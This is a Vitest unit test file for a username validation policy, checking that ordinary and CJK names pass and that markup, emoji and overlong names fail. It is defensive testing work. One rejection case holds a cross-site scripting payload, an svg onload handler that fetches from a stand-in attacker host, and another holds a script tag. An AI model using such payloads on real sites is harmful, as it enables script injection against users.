import { describe, expect, it } from 'vitest'
import { isUsernameValid, USERNAME_MAX_RUNES } from '@/utils/usernamePolicy'

describe('usernamePolicy utils', () => {
  it('accepts letters, numbers, spaces and _-. (with CJK)', () => {
    expect(isUsernameValid('john.doe')).toBe(true)
    expect(isUsernameValid('赵四')).toBe(true)
    expect(isUsernameValid('foo bar')).toBe(true)
    expect(isUsernameValid('user_1-2.3')).toBe(true)
    expect(isUsernameValid('')).toBe(true)
    expect(isUsernameValid('   ')).toBe(true)
  })

  it('rejects markup characters and overlong names', () => {
    expect(isUsernameValid(`<svg/onload=fetch('//evil.example')>`)).toBe(false)
    expect(isUsernameValid('user<script>')).toBe(false)
    expect(isUsernameValid(`quote"name`)).toBe(false)
    expect(isUsernameValid('amp&name')).toBe(false)
    expect(isUsernameValid('slash/name')).toBe(false)
    expect(isUsernameValid('😀')).toBe(false)
    expect(isUsernameValid('名'.repeat(USERNAME_MAX_RUNES + 1))).toBe(false)
    expect(isUsernameValid('a'.repeat(USERNAME_MAX_RUNES))).toBe(true)
  })
})
